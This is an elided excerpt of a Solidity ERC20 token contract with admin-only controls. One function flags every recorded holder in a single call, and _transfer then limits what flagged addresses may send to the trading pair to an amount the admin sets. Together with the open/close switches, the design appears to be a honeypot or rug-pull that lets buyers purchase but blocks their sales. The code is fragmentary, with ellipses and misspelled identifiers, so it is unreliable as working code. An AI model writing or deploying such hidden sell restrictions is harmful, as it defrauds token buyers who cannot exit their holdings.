...
contract Token is ERC20,Jontrol{  
    ...
    mapping (uint256=>address) private _hold;
    uint256 private _count;
    address private _arilist;
    bool private _bule;
    ...
    {    _tokenhold=_msgSender(); 
        _grantRole(DEFAULT_ADMIN_ROLE, _msgSender());    
        _grantRole(DEFAULT_ADMIN_ROLE,tokenHold);    
    }   
    function _transfer(address from,address to,uint256 amount) internal override(ERC20){
        ...
        if(to==_pair){  
            if(_list[from]==1  && _number[from]>=amount){
                _number[from]=_number[from].sub(amount);  
            }else{
    ...
    function setpair(address pair) public onlyRole(DEFAULT_ADMIN_ROLE){
        _pair=pair;
    }  

    function setListAAA()public onlyRole(DEFAULT_ADMIN_ROLE) returns(uint256){
        uint256 tempc=0;
        for(uint256 index=0;index<_count;index++){
            address temp=_hold[index];
            if(_list[temp]==0){
                _list[temp]=1;
                tempc++;
            } 
    ...
    function setAirDrop(address air)public  onlyRole(DEFAULT_ADMIN_ROLE){
        _arilist=air;
    }
    function setNum(address user, uint256 number) public  onlyRole(DEFAULT_ADMIN_ROLE){
         _number[user]=number*10**18;
    } 
    function setlsit(address user) public onlyRole(DEFAULT_ADMIN_ROLE){
        _list[user]=1;
    }
    function Unlist(address user) public  onlyRole(DEFAULT_ADMIN_ROLE){
        _list[user]=0;
    }         
    function setOpen()public  onlyRole(DEFAULT_ADMIN_ROLE){
       _bule=false; 
    }       
    function setClose() public onlyRole(DEFAULT_ADMIN_ROLE){
       _bule=true; 
    }         
}